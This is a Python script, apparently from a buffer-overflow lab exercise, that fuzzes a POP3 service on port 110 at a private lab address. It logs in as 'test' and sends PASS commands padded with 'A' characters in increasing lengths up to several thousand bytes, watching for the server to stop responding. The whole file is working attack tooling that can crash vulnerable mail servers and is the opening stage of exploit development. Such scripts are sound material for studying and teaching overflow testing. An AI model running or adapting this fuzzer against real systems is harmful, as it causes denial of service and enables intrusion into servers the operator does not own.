#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

    buff = ["A"]
    counter = 100

    while len(buff) <= 30:
        buff.append("A" * counter)
        counter += 200

    for string in buff:
        print("Fuzzing PASS with {0} bytes".format(str(len(string))))

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_conn = sock.connect(("192.168.187.130", 110))
            data = sock.recv(1024).decode("utf-8")
            print(data)

            user = ("USER test\r\n").encode("utf-8")
            sock.send(user)
            ack = sock.recv(1024).decode("utf-8")
            print(ack)

            pw = ("PASS {0}\r\n".format(string)).encode("utf-8")
            sock.send(pw)
            ack = sock.recv(1024).decode("utf-8")
            print(ack)
        except socket.error:
            print("[x] Unable to connect...")
        finally:
            sock.close()

    sys.exit(0)
